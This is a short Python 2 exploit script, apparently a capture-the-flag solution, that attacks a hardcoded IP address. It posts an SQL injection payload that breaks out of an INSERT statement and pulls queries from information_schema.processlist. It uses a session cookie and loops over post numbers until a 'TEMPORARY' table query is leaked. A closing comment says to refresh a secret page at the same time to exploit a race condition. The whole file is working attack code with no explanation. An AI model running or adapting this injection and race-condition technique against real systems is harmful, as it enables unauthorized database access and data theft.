import requests
import threading

last_no = 9370
data = {'title': 'asdf',
        'contents': "asdf'), ('result', 'kimtruth',(select group_concat(info) from information_schema.processlist where info NOT LIKE '%INSERT%'))#"}

headers = {'Cookie': 'PHPSESSID=k573bkkp3ce7p51rddt89l9jo4'}

while True:
    last_no += 2

    r = requests.post('http://110.10.147.36/write_ok.php', data=data, headers=headers)
    print r.text
    r = requests.get('http://110.10.147.36/?p=read&no=' + str(last_no), headers=headers)
    if 'TEMPORARY' in r.text:
        print r.text
        break

# execute this source and simultaneously refresh the site in secret page repeatedly (race condition)